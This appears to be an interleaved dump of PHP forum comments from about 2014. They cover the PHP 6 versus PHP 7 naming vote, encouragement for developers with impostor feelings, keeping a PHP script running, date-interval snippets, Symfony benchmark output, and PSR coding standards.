So wait though... Does anyone known *why* the voting was cancelled? Also it seems pretty obvious that the RFC author wants it to be PHP7. The section *"No good reasons NOT to skip version 6"* actually makes arguments in favor of PHP7. I mean, I agree, but still. I don't even see why a vote on this was necessary. Or cancelled. Probably because they realized that this is a no-brainer, and fear public input ruining this clear and easy decision.
What about PHP 6.5?
I want to see [novelty_string](/user/novelty_string)'s 10-20ms till the page get's rendered. You can have that, but not with symfony. The benchmark attached is to show that just using a bare bones symfony2 will cost you ~180ms in rendering time.
Agreed, there is a version 6. My friend learnt it in school 2 years ago. She's got the book. 10 shades of stupid is naming it the same thing as something else. 
But, I'm running 5.5 on a couple servers already…
I guess I'm just not understanding it. I need a real world example.
The reason why it was canceled, is that after the vote was started Zeev edited the RFC to include many more arguments in favor of PHP 7 and dropped a number of paragraphs arguing in favor of PHP 6. Which made the whole RFC very, very biased. 
hey somehow lots of devs in forums like to be rude or be like "a real dev should know this" and passive-agressive stuff like this. dont feel intimidated and just ignore the rude guys out there. i like to picture them as very lonely sad people ;) i suggest: look into books/topics like "refactoring" and "designpatterns" - i just found a good book but its only in german. title is "learn to program less worse" - pretty interesting aproach, but i couldnt find an englisch version of it. personally i learned the most by talking with programmer friends about problems. i still do this via skype or in pubs. 
First off, don't get discouraged. The web dev community is harsh, and a lot of people who blast other people in forums and such are just self-centered, self-important douchebags, not interested in helping others out. So don't focus on the people not interested in helping you. Save yourself from wasted time and energy. Second, I've been a web dev professional for over 10 years. I got my degree in English, and Classical History. I have no computer science education or IT certs AT ALL! I can tell you going to college is not necessary! Read documentation, build mock projects, over and over until you get the basics down, and then just apply for job. Be forewarned though, the web dev market is overly saturated (i.e. lots of designers with fail skills, and framework boys/girls), and it will be tough to get one, but it's not impossible. There are a lot of amateurs in this field who know enough to write really shitty code, and they just know how to bullshit there way through an interview. So, my advice is learn your shit, learn it well, and don't get discouraged.
I think in this field it's impossible to ever shake that feeling that everyone is smarter than you. Don't let it get you down.
Maybe something along these lines (assuming your update logic takes &lt; 1 second): set_time_limit(0); // the script will never time out $time = time(); // get the time while(true) { // always loop doSomething(); // put your update stuff here time_sleep_until($time+1); // sleep until it's one second after the previous iteration $time = time+1; // set the new time to 1 second later }
Tiny violins play for the old PHP6 book authors and readers. It's far more confusing to skip a major version than to deal with a tiny subset of the community that was doing it wrong.
If you know of any great framework agnostic/vanilla PHP intros to MVC, DI, and automated testing, feel free to share. I only recommend laracasts because the videos are well done and cover all these topics. I feel all this stuff is presented in a way that is useful even if you never use Laravel.
They made books for a programming language version that didn't exist. Tiny violins. When PHP6 is released then legit books will come out for it.
Why not just start naming it by release date: Php-2014.07.20?
https://twitter.com/zeevs/status/490948840661340161 &gt; "@ircmaxell it’s clear that the majority of PHP leaders support 7, so now the 6 camp is looking into changing the rules? Come on." Projection much? Also, I didn't realise PHP had leaders...how do they chosen? Are they voted in, or is it more of a 'strange women in lying ponds distributing swords' thing?
Hm. So set_time_limit(0) will make it so the script runs on the server forever without anyone accessing a page?
Agreeing. Just ignore the rage. Many devs have social skill issues, or even Aspergers syndrome. This type of personality is drawn to this line of work, which they can do quite well. But not always while being nice to peers. Source: my own bad behavior and experiences. Also the field is extremely complex, and you just cannot learn everything. You pick a specialty, and always keep learning. 
And the moment you know that you're the smartest in the room, you know what to do. 
Being able to validate a "$model" means that it no longer has any integrity. This is a problem that will cost you as your application grows.
Some watery tart handing out weapons is hardly something on which to base a system of government. Help, I'm being repressed.
It will cause the the script to not time out. Then you have a while loop that will never end, so it should run indefinitely. However, there may be a better, safer way to handle this.
Most likely because php follows http://semver.org/.
You want a number, which is increased with one every second? I'd suggest you use a php default function: http://nl3.php.net/time No need to run such a loop. Just substract the unix timestamp of the point on which you start counting from the current timestamp, and you have the amount you want :)
So... What? Is he supposed to write his own MVC or something before he even looks at a framework? What does this even mean? Terrible advice, in my opinion, and an excellent example of what this person was talking about. I've seen the wheels you "real programmers" laboriously and cleverly reinvent when you find some pet, idiosyncratic design pattern and do everything w/out a framework, because you think you can do better. Most of them ain't all that... Many of them end up being refactored, or at least resented by the poor sods that have to support or extend your brilliant OO spaghetti. 
... what? D:
It was just an example. I want a more complicated script to update every second changing a bunch of MySQL entries. 
That sounds just awfull. Are you sure you need to update your database every second? Is there no way you could recalculate stuff when you need certain data? Doing 'unnecessary' database operations every second is something you want to avoid, and I have never seen a case where such a thing was necessary in web programming. Desktop software would be different, but I wouldn't use PHP for that.
go to a room with more people
No, adhering to "design patterns" and not thinking for themselves is what Framework Boys do.
Would've if I knew any! Just wanted to add the bit that I added :) Frameworks aren't the be all and end all, just wanted to voice that.
Yeah, this is utter nonsense. If you spend all your time learning some framework, and you will become versed in that frameworks idiosyncrasies. When you get tired of bumping up against whatever limitation your framework has, thats when you can branch out and rapidly pick up another framework, or come up with your own home grown solution. By the time you *need* to expand beyond the borders of whatever framework you've chosen, you'll have reached a point where your skill and understanding can handle the nuances of why you would even want to do things differently. But avoiding frameworks usually indicates somebody who's either too wet behind the ears to know how much effort they're burning reinventing solutions to common problems, or too full of hubris to understand that good enough is vastly superior to perfect.
So I guess I should explain a little more about this. My end goal is to be able to access perpetually changing information. I actually have a version of this functioning at the moment by using a cron job to run a PHP script every second. But I'm looking for a better option. So say I have x and y coordinates. I want the coordinates to change constantly based on my code, and then I want to access the x and y coordinates to track where the object is on the plane. That's just an example. Another could be the height and age of a tree object that "grows" over time. Try to ignore the why? of this question, cause it's just a small scale project that I'm working on in my free time. Thank you for you help!
You want to set up a crontab to run every second. This is easiest by far on Linux. Checkout the Crontab -e Command and the syntax. Make sure you have permissions for that... On the phone right now, so no links or examples... 
Again, I don't get it. Consciously choosing a design pattern or framework does not preclude knowing how to program well. Just because someone learns a framework doesn't make them some coding hipster equivalent of a script kiddie.
You are giving terrible advice. This kid doesn't know design patterns. Frameworks are a great place to not only learn them, but to see how / why / when they would be implemented. Btw, learning a framework doesn't really limit you, as every large company uses one or another and no one who programs professionally has any issue with someone who learns them.
NodePHP so everyone jumps on board because they're told it's awesome!
As someone who spends 12h+ every day on IRC dev channels, I've noticed that when a forum/channel is for the general discussion of a language (e.g. ##php), the discussion tends to be hyper-focused on how programming 'should' be done, which is certainly important but it can easily become overly pedantic. It's important not to confuse strong opinions for hostility directed towards you. Channels focused on a specific frameworks (#laravel) or CMSes (#concrete5) tend to be more easy-going, and are a good place to learn about new developments. The truth is, you _should_ be exposing yourself to new ideas, and if you feel intimidated that's not necessarily a bad thing. It can be a sign that you've found something new to study. It's completely normal to feel like this. You may feel like you 'can create any script [you] need', but I'll say as someone with 16 years experience who works every day to keep improving his skills, I don't feel like this at all. There are definitely things I can't do, and many things I know I could do better. Perhaps you're at the point now where 'independent study' shouldn't just mean doing things like CodeAcademy or reading tutorials (though I try to find time each day to read a tutorial or watch a presentation on something new), but working on projects. There are loads of open-source projects on github, or you could start your own. Being a good programmer is more about being a good problem solver than about learning a particular language. You can look for a problem you want to solve then figure out how to solve it, or you could read up on some new technique/idea/pattern/etc. and then think about what problems that might help you solve. To give a concrete example, I'd recently read up on `libcurl` and rewrote a bunch of blocking libraries that waited on a responses from external webservices, into non-blocking requests running in parallel using `curl_multi`. Before that, I consolidated the various tasks I had as vim/shell/php scripts into `grunt.js`. My reddit feed is all programming related, and I haven't even heard of half the things I see, but I read much of it and try to apply it to work I have or want to do.
Honestly that's the school's fault. The original PHP 6 was scrapped back in 2009 without ever being released.
As you get older, you realise there are many people smarter than you. And you know what? It's fine. 
8-ish years of experience and still intimidated by other programmers. At the end of the day, there is always someone out there with more experience or who is simply smarter than you are. Or hell, someone with less general experience, but a lot of experience with something very specific (e.g. Wordpress). That's life. Maybe give us some examples with where you feel comfortable, and where you don't feel comfortable, and then we can gauge where you are and what might be a good next step for you. 
Point taken. 
Changing the matter being voted upon, while the vote is in progress. *Stay Classy.* Seems like a silly thing to vote about anyways. Do they vote on literally every little thing? [Curchill said it best ;)](https://lh6.googleusercontent.com/-2Rt5vGWbb4Q/UJj0rGyJahI/AAAAAAAAh-s/kVudcxMlkzM/w506-h316/Sir-Winston-Churchill.jpg)
Create a script that has: set_time_limit(0); while(1) { Then run this from command line: nohup php myscript.php &amp; And you're set.
Shouldn't these things be, you know, [purple?](https://php.net/) Also, why are they out of the Green ones they show in the pictures?
I haven't used Laravel outside of that basic benchmark so im certainly no expert. That said, I'm not sure what else could be done to bump performance without modifying the core or implementing heavy caching. As I stated in my reply (which he has thus far ignored) installing the Laravel application disabled debug, optimized composer, and most importantly, combined Laravel in a single file for reduced stat calls and improved opcode caching. I'd love to be corrected here but until he responds I'm going to call bullshit. I know Laravel is the up there with Apple in marketing prowess but you don't have to have the fastest framework to make it be successful so don't try and sell it as such.
And how would you stop the script?
Anybody here got opinions on Varnish?
It's a "damned if you do, damned if you don't" kind of situation. I feel that PHP is more damned in the eyes of the development community at large if they skip a major published version, no matter the reason.
Happens to the best of us. Your feelings are very real. Most people feel/have felt them. It's called [Impostor Syndrome](http://en.wikipedia.org/wiki/Impostor_syndrome). Just keep on coding. I found that once I started working with a team and holding my own it got a lot better.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Impostor syndrome**](https://en.wikipedia.org/wiki/Impostor%20syndrome): [](#sfw) --- &gt;The __impostor syndrome__ (also spelled __imposter syndrome__), sometimes called __impostor phenomenon__ or __fraud syndrome__, is a psychological phenomenon in which people are unable to [internalize](https://en.wikipedia.org/wiki/Internalize) their accomplishments. Despite external evidence of their competence, those with the syndrome remain convinced that they are frauds and do not deserve the success they have achieved. Proof of success is dismissed as luck, timing, or as a result of deceiving others into thinking they are more [intelligent](https://en.wikipedia.org/wiki/Intelligent) and competent than they believe themselves to be. &gt; --- ^Interesting: [^Dunning–Kruger ^effect](https://en.wikipedia.org/wiki/Dunning%E2%80%93Kruger_effect) ^| [^List ^of ^impostors](https://en.wikipedia.org/wiki/List_of_impostors) ^| [^Elizabeth ^Harrin](https://en.wikipedia.org/wiki/Elizabeth_Harrin) ^| [^Dan ^Nainan](https://en.wikipedia.org/wiki/Dan_Nainan) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cj2xebd) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cj2xebd)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
I made a bunch of changes. These include * Split Purse into purse and purse-core. The former is what people should use when making an app, and the latter is the actual framework. * Added Composer support. * Attempted to comply with PSR-4. * Removed all the nasty globals stuff. * Added some nice autoloading and bootstrapping functionality. * Added CONTRIBUTING.md to encourage people to send pull requests (thanks CarwynNelson for contributing!). I would appreciate it if you guys could check it out and tell me if you consider it an improvement. I'm sure I left plenty of things out as well — I know Purse could use some more features, but I'm working on it. https://github.com/Phyramid/purse https://github.com/Phyramid/purse-core
PHP X
These deserves infinite up votes. 
Get the process ID using: ps aux | grep myscript Then using the process ID to stop it: kill -9 #####
I'm the lead developer and the head of software engineering for a company with a multi million pound turn over. I'm still constantly learning / evolving as a developer and still get confused by some of the things I read online. Don't worry about it just keep learning there'll always be people that know more than you and those you know more than!
You also begin to realize that people you thought were smarter then you actually are not. And you also begin to learn how to pick these things up. Once you get experience working with both good and bad developers you learn how to read people and just know.
Thank you so much. I'll check this out. 
I've been in software for 15+ years. The experience of being a software developer is one of *constantly* smashing yourself up against your own ignorance and incompetence. A program doesn't work, confuses you, you don't understand it, it's frustrating and embarrassing, *then you have the necessary conceptual breakthrough* and it all makes sense. Then you move on to the next project. I can't imagine how bored I'd be in a job that wasn't like that. The only question is if you have the temperament to use that pressure for consistent self-growth. If not, then software engineering might not be a field you want to consider as your profession.
as I mentioned to [someone else earlier](http://www.reddit.com/r/PHP/comments/2b63vj/voting_on_the_name_of_php_next_has_started/cj2m1bw?context=1): &gt; I was leaning towards a naming scheme like PHP YY.MM (like Ubuntu), but I realized you lose the advantage of semantic versioning — what do you call bug fix releases? How do you indicate backwards compatibility breaks?
A RFC goes through a [process](https://wiki.php.net/rfc/howto). The RFC goes through discussion and updating before the voting. If the wasn't enough for-PHP7 arguments in the RFC that should have been handled long before the vote was opened. 
Well that was quick. PHP6 - be done with it. I think we have all forgotten the horror that was the original PHP6 to be worried about a possible name clash.
Yep, and if you read phpinternals, Zeev requested the vote be paused until more of a case for PHP7 could be made: http://news.php.net/php.internals/75701
That looks to be more characters than a traditional for loop
This looks like a more elegant way of doing things. I'm gonna look into this to see if I can figure it out. 
&gt;@ GTFO
there isnt any initialising and ++ing any unused var creates it and @ supresses the warning
While your tip is in fact 4 characters shorter than a traditional for-loop, it's solving a problem that doesn't exist.
its faster, and ppl may use it dislike? fine move along
Regardless, catering to the fact that a few books are named "PHP6" and there's an old dead branch doesn't merit a version skip.
Cool! It's great you've been responsive to some pretty negative initial feedback. I may be able to go into more stuff later, but just a couple of notes from what I've seen so far: * While PSR-4 technically allows you to omit the sub-namespace, it's good practice to have one to prevent potential namespace clashes with other projects, especially since your project is a common English noun. I'd suggest using `Phyramid` as your vendor namespace and `Purse` as your sub/project namespace: `Phyramid\Purse`. You'll also want to switch your composer name to match to avoid confusion (though it's fine if you still call Purse Core `phyramid/purse-core` to differentiate it from the app implementation at `phyramid/purse`). * Seriously consider adopting [semver](http://semver.org/). It'll make it much easier to for consumers to target specific versions of your library. At the very least, adopt some sort of incremental version scheme. * Rather than manually writing in your repository in `composer.json`, publish `purse-core` to Packagist when you've got things stabilized and have a versioning scheme in place. Then people can just add the one line to their `composer.json`'s `require` block and avoid the `vcs` block.
did he though? I thought he only removed the pro php7 bits that were hastily added to the rfc before adding his section to it. I read all 3 versions and honestly can't remember there being actual pro php6 arguments that zeev deleted. The whole reason the php6 part reads pro php7 is that he added back the paragraphs he had deleted earlier. the whole rfc never had much arguments pro php 6 other than "6 comes after 5". 
best jump to php 600 then
think deeper b4 insulting @ is in effect supress the warning when initialising a variable with ++
just checked the wiki revisions and zeev didn't delete anything. maybe ajf should have actually written an argument for it, rather than canceling the vote and accusing zeev of deleting her php6 arguments. this was the first version she posted: &gt;PHP 6 is the most obvious name choice. The main argument against [...] &gt; Finally, I don't think the alternative naming options are really much better. later versions only added more content pro php7, so it's understandable zeev deleted those from the php6 section. https://wiki.php.net/rfc/php6?rev=1404594699 
What school? I smell bullshit. To see that PHP 6 doesn’t exist yet, see [PHP’s official Subversion page](http://php.net/svn.php) . Subversion, or svn, is the source code control software used for the development of PHP. 
he didn't
It's yet another reason to mock PHP. There's no consistency to be found here. This is just another soon-to-be newsworthy derisive joke from every other language development organization, as if that's the secondary goal here. If you write a book about a php7 that didn't exist, will they change? THERE'S NO GOOD REASON NOT TO GO TO PHP8, amirite?
Think like PHP is a toolbox, and you are pretty good at knowing most of the tools, the basics, like screw drivers, hammers, saws, and a few power tools. Then you look on a forum and see a tutorial on some obscure router saw that you have never had to use and can't really see a use for in what you are currently doing. One day however, you are approached to make some cabinet doors and you try and try to figure it out, and bam, you remember the router saw. You go pick it up, try it out, practice with it, make a few hundred cabinets, and soon you are a pro with it, even recommending specific models over other ones, or specific use case scenarios and settings. So PHP (or any programming language) is the same way. You are good at a bunch of the basics and maybe a few oddities here and there. Some of those obscure terms, packages, and what not that people talk about are not useful to you right now and you probably shouldn't really concern yourself with them at the present. As you get going in your career you will learn those things and eventually be right up there with the rest of those hot shot programmers.
* set_time_limit(0) is close to useless - always, your web server is going to time out the request regardless of what PHP wants. * you would be running this script from CLI - where the time limit is hard coded to zero (infinity). * ... so this makes set_time_limit(0) pretty much useless.
Redis? I am using MariaDB and it works without any issues. I use it for all kinds of things. I generally keep my SQL simple and in converting a large codebase I did hit a tiny snag that would make MariaDB not a snap in replacement but while I forget what change I needed to make it might have taken 5 or fewer minutes to make the change in a codebase that has at least very different 100 SQL statements (I'm not counting the ones that are minor variations of each other). If you are meaning redis I didn't know that wordpress could use it. 
I have been a developer for 15 years. I have a dozen languages under my belt and oodles of server configurations. A recently hired developer with a college degree (I haven't one) mentioned a control-break statement in a conversation. I didn't know what he meant and gave a short explanation. Still wasn't understanding because he was using more statements I didn't know. Finally he demonstrated with code. That I understood immediately and is a technique I had been using for years. Most of the "real developers" I have run into were decent enough people and glad to help. The only difference between them and myself is they know the names of stuff. One way I have gotten confident is by not using Google to search for solutions to simple code problems like, what are all the parameters for the date() functions, how to order an array of data, stuff like that. For that, I have my books. Looking up the answer not only makes me ask more specific questions but also goes over the information so often that eventually I remember it and not need it so much. The point is, there are people who know this better than you. Probably even where you work (unless you're the lone developer). But just because they know the names of stuff, doesn't make them better developers. I have seen people with bachelors of computer science who throw out completely crap code, so don't think they are better then you are. In short, read and reference books often, ask dumb questions, contribute simplistic sounding answers, and don't think anyone is better than you just because they use elephantine utterances. :)
I've written some starting documentation [as promised](http://www.reddit.com/r/PHP/comments/2axaru/spiffyframework_100alpha_tagged/) on using the framework. If there are any questions, concerns, grammatical errors, etc. feel free to reply here or create an issue on GitHub. If I'm missing something don't hesitate to ask. Documentation always has room for improvement so don't be shy.
Why not PHP#? Or PHPEE? 
Planing is good but not in depth because you will found out that the initial plan will change a few times until you hit alpha. So at the end of the day in depth planing from the start will cost you time.
https://github.com/apenwarr/git-subtree
ajf is pro-7.
http://art-caramba.ru/php_elephant 
That's why I'm here. :)
http://reactphp.org/ Also, the functions *always* return in the order they're called.
Let me tell you a story that will help you in this case. I once created Reddit alien Snoo using LateX (the markup language). I was pretty gun-ho about it and posted to /r/latex. The mods and others loved it so much they asked me to put it as the logo of the subreddit after a few minor changes like adding the name of the sub on Snoo's belly. Then comes a genius and trashes me for using the way to code it the way I did. He suggested 5 other things I should have used to get it done. I was ashamed that I barely knew about any of those things. I did not take offense and asked him to help me on how to get that done. He says "I don't remember it as I worked on it long time ago.". He knew enough to trash me for what I did, but he did not know how to do it other way and even if it would be feasible. He could have Googled it at the very least, but he was a rude lazy guy who knew nothing at least at the time of commenting. So don't feel that way. If you know you can write any script possible you are already ahead of a lot of people. Just make sure you are writing it in a way that you can still understand what you wrote after a few weeks. If that is done too, you are good to go. Continuous learning has no alternative though, but most of it is in the fundamentals and if you are good there you are good almost everywhere. 
Id stick with 6. The arguments in favor of skipping are fairly poor. The internals team of course does not like the 6 version number but they need to understand the effect of the lay man. Try to convince web hosts to upgrade from 5 to 7. Holy crap! It's hard enough to go from 5.2 to 5.3. 
I was taught "PHP 6" in a class at DeVry in 2011. Almost everything taught was wrong, but it was still taught, and there are still people in the workforce who believe PHP 6 to exist.
I have to agree with hansaplast. The library can grow into something nice but right now is more effort then writing the functionality yourself. 
the more i learn the more i feel like an idiot with programming languages. You're on the right way.
I am quick to use a foreach, but really they're all tools and have their respective strengths and weaknesses. Use what's right for the task. :)
A) That's php's git page. PHP uses git now. This is exactly the situation of outdated information that the devs are trying to avoid getting handed down to newbies. B) a casual user of php (or newcomer to the language) doesn't have the *foggiest* that they're "supposed" to check the git log / tags for released branches to confirm whether a major version of php exists or not. All they know is they've seen some books on the shelves which say "php 6" and they picked one up.
 for($p = 0; $p &lt; 5; $p++) { $d = new DateTime((-1 * $p).' days', new DateTimeZone('Europe/Warsaw')); for($h = 5; $h &lt;=8 ; $h++) { echo $d-&gt;format('d-').$h."\n"; } }
What? PHP8's been mentioned already? Better PHP9 just to stay ahead of the curv--Nope. PHPX, that's what we'll call it...next.
I actually like DeVry as a vocational, but that's sad.
How will sysadmins be confused by version 7? It will be the latest version of the software. &gt; The millions of people devving in PHP casually? Those people have walked past a few books in bookstores proclaiming that php 6 fixed all the unicode problems. *They* will be the most confused.
Jeffrey way is amazing. Super talented and gives back to the community. If you're learning Laravel anyways, but this dude a coffee and sign up. Totally worth it. :)
Shoot. Now I hear it. Shoot! 
 date_default_timezone_set('Australia/Brisbane'); $start = new DateTime('5am'); $end = new DateTime('7pm'); $start = $start-&gt;sub(new DateInterval('P5D')); $end = $end-&gt;sub(new DateInterval('P1D')); $intervals = []; while ($start-&gt;getTimestamp() &lt;= $end-&gt;getTimestamp()) { $intervals[] = date('Y-m-d H:i:s', $start-&gt;getTimestamp()); $start-&gt;add(new DateInterval('PT10M')); } var_dump($intervals);
Sorry, I just re-read your post and see you want hours only. Just change line 11 to: $start-&gt;add(new DateInterval('PT1H'));
in second bullet point; '..Often, lots of individual params might be a smell for merging grouped data into value objects...' - does it means we could group multiple arguments (based on their relationship eg. country_code,country_name etc.) into VOs and pass them instead
&gt; A) That's php's git page. PHP uses git now. This is exactly the situation of outdated information that the devs are trying to avoid handing down to newbies. That took a LOOOONG time for someone else to notice. I copy-pasted from SO, which won't be updated either. You know what's official? The official repo. There's no PHP6. &gt; All they know is they've seen some books on the shelves which say "php 6" and they picked one up. If you take anything as gospel you pick up at a bookstore (or read on an arbitrary forum), that's not a distribution problem.
Will do! I just didn't want to publish it to Packagist before it was in an acceptable state. Thanks again for all your suggestions. 
&gt; If you take anything as gospel you pick up at a bookstore (or read on an arbitrary forum), that's not a distribution problem. Why the fuck wouldn't you, as a layman, do that? It's likely an entire book written by someone with a decent resume and very obviously with a comprehensive knowledge of PHP. People are going to assume it's going to get 98% of things correct, including major points like "what's new in 'PHP6'". And blaming newcomers for reading books isn't how you go about continuing to foster a language, assuming you'd like to it to continue growing (if you don't mind it dying off, please say so so I can stop replying). The way you do that is to make as much information as possible, as least confusing as possible, so its hard to get wrong in the first place . ATM releasing a new PHP6, which represents something quite different from what it was "supposed" to mean just a year ago, is *not* making things least confusing. The bottom line is that if you call it PHP 7 then it doesn't get associated with all the old information. A sysadmin or developer will wonder why PHP skipped a version, ask their colleague, hear why , and then go on with their day. It's ten times a bigger deal for new people.
That explains a lot! Great that there are now. Did it fully answer your question?
Hi, I'm the developer and would love some feedback on this project. Any questions welcome. I've been using it daily for a while now and find it great at stopping trivial errors getting into a commit. Hopefully it's useful to others too!
&gt; It's an entire book written by someone with a decent resume and very obviously with a comprehensive knowledge of PHP. I'm sorry but that's nonsense. Just like wikipedia (citations are king, in the void), any published manuscript does not correlate to a fact. I can point you to many books that claim falsehoods. PHP doesn't "need" some half-hearted attempt to foster community growth by saving a few hundred incompetents some trouble, just because someone printed a book about the moon landings being faked or PHP6 being some now-dead project.
See below. The Symfony framework adds 12ms to any page request on this particular machine (which is fucking ancient btw). $ ab -n 1000 -c 100 http://localhost.com/ This is ApacheBench, Version 2.3 &lt;$Revision: 1528965 $&gt; Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking localhost.com (be patient) Completed 100 requests Completed 200 requests Completed 300 requests Completed 400 requests Completed 500 requests Completed 600 requests Completed 700 requests Completed 800 requests Completed 900 requests Completed 1000 requests Finished 1000 requests Server Software: nginx/1.4.6 Server Hostname: localhost.com Server Port: 80 Document Path: / Document Length: 0 bytes Concurrency Level: 100 Time taken for tests: 12.761 seconds Complete requests: 1000 Failed requests: 0 Total transferred: 315000 bytes HTML transferred: 0 bytes Requests per second: 78.37 [#/sec] (mean) Time per request: 1276.052 [ms] (mean) Time per request: 12.761 [ms] (mean, across all concurrent requests) Transfer rate: 24.11 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 0 0 1.1 0 5 Processing: 51 1214 203.9 1262 1376 Waiting: 51 1214 203.9 1262 1376 Total: 55 1215 202.9 1262 1379 Percentage of the requests served within a certain time (ms) 50% 1262 66% 1273 75% 1281 80% 1286 90% 1300 95% 1318 98% 1331 99% 1349 100% 1379 (longest request)
They're not incompetents. They're learners, who may not have had years of context and cynicism of the programming world baked into their consciousness but who you want to write off anyway. I hope you never have to help anyone learn yourself, so your attitude doesn't infect too many others. 
What did you use to draw [this](https://camo.githubusercontent.com/917c0c92bc1dfde2ee24db71ff9f50fdd21a6594/687474703a2f2f7777772e676c696666792e636f6d2f676f2f7075626c6973682f696d6167652f353938303334392f4c2e706e67)?
It's the other way around; PSR-1 inherits from PSR-0/4 and PSR-2 inherits from PSR-1 which in turn inherits from PSR-0/4. According to the standard if you are just using PSR-0/4, you are not obliged to follow PSR-1 or PSR-2.
PSR-4 doest not inherit from PSR-0. It replaces. Extract of [PSR-2](https://github.com/php-fig/fig-standards/blob/802a51aea1cfb26bfce5027967a1ebbce7c3d84e/accepted/PSR-2-coding-style-guide.md): &gt; Code MUST use 4 spaces for indenting, not tabs. PSR-0 and PSR-4 are for autoloading. PSR-1 and PSR-2 are for coding style guide. PSR-3 is for log. PSR-5 is PHPDoc. PSR-6 is caching. PSR-7 is for HTTP messaging. 
PSR-4 is only concerned with autoloading, it doesn't inherit from any other standards (although it's compatible with PSR-0). Use whatever coding style you like (outside of the restrictions on class naming of course). PSR-1 and PSR-2 are the coding style guides (and 2 inherits from 1).
I'm in the middle on this thing. But what's so confusing about skipping a version number? Who exactly would be confused? What problems can you imagine as a result? Serious question, if you have any answers. Yeah I'm sure people will initially think... "that's odd", look it up and find out the reason in about one minute. From here on everything is clear and separate. Keeping with 6, means we're going to start seeing articles about the "real PHP 6", "the old PHP 6", but mostly just labelled "PHP 6", and we'll have to delve into the contents to work it out on our own. I don't care about books, I care about ambiguous search terms giving me irrelevant results. I don't see how perpetually getting a bunch of irrelevant results when you search "php 6" is considered "less confusing" than "oh, they skipped a version". There's already 2 million+ results for "php6" OR "php 6" on Google. How am I meant to narrow them down? This kind of searchability stuff is why I'm a big fan of Germanic joined words for product names. Makes searching for shit much easier when you don't have the option of "phrases terms in quotes".
Off topic question. Can you share PS1 setup?
The route returns an empty response. No caching is being done, this is simply the overhead from loading up the symfony framework. E: here's the curl output $ curl -v http://localhost.com/ * Hostname was NOT found in DNS cache * Trying 127.0.0.1... * Connected to localhost.com (127.0.0.1) port 80 (#0) &gt; GET / HTTP/1.1 &gt; User-Agent: curl/7.35.0 &gt; Host: localhost.com &gt; Accept: */* &gt; &lt; HTTP/1.1 200 OK * Server nginx/1.4.6 (Ubuntu) is not blacklisted &lt; Server: nginx/1.4.6 (Ubuntu) &lt; Content-Type: text/html; charset=UTF-8 &lt; Transfer-Encoding: chunked &lt; Connection: keep-alive &lt; X-Powered-By: PHP/5.5.9-1ubuntu4.3 &lt; Cache-Control: no-cache &lt; Date: Mon, 21 Jul 2014 10:05:13 GMT &lt; X-Debug-Token: 817c33 &lt; X-Debug-Token-Link: /_profiler/817c33 &lt; * Connection #0 to host localhost.com left intact Edit 2: lol just noticed x-debug-token in the headers, which means symfony was running in slow mode, here is prod settings: Concurrency Level: 100 Time taken for tests: 4.548 seconds Complete requests: 1000 Failed requests: 0 Total transferred: 263000 bytes HTML transferred: 10000 bytes Requests per second: 219.89 [#/sec] (mean) Time per request: 454.777 [ms] (mean) Time per request: 4.548 [ms] (mean, across all concurrent requests) Transfer rate: 56.48 [Kbytes/sec] received 
It's like you want. Create a service is useful when your class has dependencies. For example if you need the security context, the best practice is to create a service with an argument of type service and name `security.context`. You should read the documentation for more details: http://symfony.com/doc/current/book/service_container.html
This looks very promising. My main suggestion would be to make it possible to `composer require` the package and register "bin" files in the package's composer.json so that you can do `./vendor/bin/static-review` or whatever instead of having to git clone the entire project. EDIT: Here's an example. https://github.com/mtdowling/ClassPreloader/blob/2c9f3bcbab329570c57339895bd11b5dd3b00877/composer.json#L21 https://github.com/mtdowling/ClassPreloader/blob/2c9f3bcbab329570c57339895bd11b5dd3b00877/classpreloader.php
Excellent idea! I've played around a bit and already I can think of several custom reviews. For example, we currently have an ugly bash script for syntax checking (`php -l` recursively on pre-commit) and I might migrate it to this for better maintainability. Is there a reason for the following: &gt; Ensure when you create the symlink that you do not use relative paths. Different developers working on the same project might have different project paths and keeping everything relative would be helpful.
Wonderful. Will this work with Mercurial?
Oops yes, fixed. Wishful thinking...
Dependency inversion is not a practice, but rather a design [principle](http://en.wikipedia.org/wiki/Dependency_inversion_principle). And good design principles apply to every part the software.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Dependency inversion principle**](https://en.wikipedia.org/wiki/Dependency%20inversion%20principle): [](#sfw) --- &gt; &gt;In [object-oriented programming](https://en.wikipedia.org/wiki/Object-oriented_programming), the __dependency inversion principle__ refers to a specific form of [decoupling](https://en.wikipedia.org/wiki/Coupling_(computer_programming\)) software [modules](https://en.wikipedia.org/wiki/Modular_programming). When following this principle, the conventional [dependency](https://en.wikipedia.org/wiki/Dependency_(computer_science\)) relationships established from high-level, policy-setting modules to low-level, dependency modules are inverted (i.e. reversed), thus rendering high-level modules independent of the low-level module implementation details. The principle states: &gt;&gt; &gt;&gt;*A. High-level modules should not depend on low-level modules. Both should depend on [abstractions](https://en.wikipedia.org/wiki/Abstraction_(computer_science\)).* &gt;&gt;*B. Abstractions should not depend on details. Details should depend on abstractions.* &gt;The principle *inverts* the way some people may think about object-oriented design, dictating that *both* high- and low-level objects must depend on the same abstraction. &gt; --- ^Interesting: [^Dependency ^injection](https://en.wikipedia.org/wiki/Dependency_injection) ^| [^Service ^locator ^pattern](https://en.wikipedia.org/wiki/Service_locator_pattern) ^| [^Inversion ^of ^control](https://en.wikipedia.org/wiki/Inversion_of_control) ^| [^SOLID ^\(object-oriented ^design)](https://en.wikipedia.org/wiki/SOLID_\(object-oriented_design\)) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cj3b1j9) ^or[](#or) 